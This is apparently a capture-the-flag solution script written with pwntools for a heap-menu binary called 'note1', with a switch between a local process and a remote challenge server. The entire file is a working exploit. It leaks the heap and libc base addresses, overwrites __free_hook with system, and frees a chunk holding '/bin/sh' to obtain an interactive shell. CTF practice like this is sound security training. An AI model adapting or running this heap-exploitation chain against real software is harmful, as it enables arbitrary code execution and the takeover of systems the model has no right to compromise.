#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./note1')
    elf = ELF('./note1')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    p = remote('8.130.172.39', 12031)
    elf = ELF('./note1')
    libc = ELF('./libc.so.6')

def choice(c):
    p.sendlineafter('choice: ', str(c).encode())

def add(sz, data):
    choice(1)
    p.sendline(str(sz).encode())
    p.send(data)

def delete():
    choice(2)

def edit(data):
    choice(3)
    p.send(data)

def show():
    choice(4)

def flip():
    choice(5)

# idx : 0x2c0 ~ 0x12b0
# leak heap
flip()
for i in range(0x82):
    add(0x80, b'A')
flip()
edit(8 * b'A')
show()
p.recvuntil(8 * b'A')
heap_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x5360
info('heap_base = ' + hex(heap_base))

# leak libc
flip()
add(0x420, b'B')
add(0x80, b'B') # padding
delete()
delete()
flip()
edit(8 * b'B' + p64(heap_base + 0x53f0))
flip()
show()
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))

# get shell
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
flip()
edit(p64(8) + p64(free_hook))
flip()
edit(p64(system)) # forge __free_hook
flip()
add(0x20, b'/bin/sh\x00')
delete()

#gdb.attach(p)

p.interactive()

